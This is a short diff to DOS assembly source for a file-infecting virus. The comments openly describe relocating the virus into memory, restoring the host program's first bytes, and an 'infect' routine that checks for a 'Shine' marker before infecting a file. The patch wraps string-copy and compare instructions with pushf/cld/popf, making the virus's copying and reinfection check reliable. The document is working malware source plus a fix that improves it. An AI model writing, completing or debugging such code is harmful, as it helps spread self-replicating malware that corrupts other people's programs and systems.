@@ -51,7 +51,10 @@ relocate:             ; Updated
      mov si, [data_section.delta_off+bp]  ; SI = Beginning of the virus
      mov di, es        ; DI = ES
      mov cx, endinging-beninging  ; CX = Virus size
+     pushf
+     cld
      rep movsb        ; Copy the virus to the new segment
+     popf
 
      mov word [jmp_seg+bp], es  ; Update the jump segment to point to the new segment
      mov ax, install  ; AX = Offset to the install code
@@ -89,7 +92,10 @@ dont_install:
      mov si, bp
      mov di, 100h
      mov cx, 3
+     pushf
+     cld
      rep movsb
+     popf
      jmp 100h
 
 ;----------------
@@ -213,7 +219,10 @@ infect:               ; DS:DX = ASCIIZ Filename pointer
      mov di, si
      add di, 5
      mov cx, 5
+     pushf
+     cld
      rep cmpsb       ; Is EOF = 'Shine'?
+     popf
      jz .abort_infection  ; Yes, abort infection
      push bx         ; Nope, let's infect this bad boy             
 
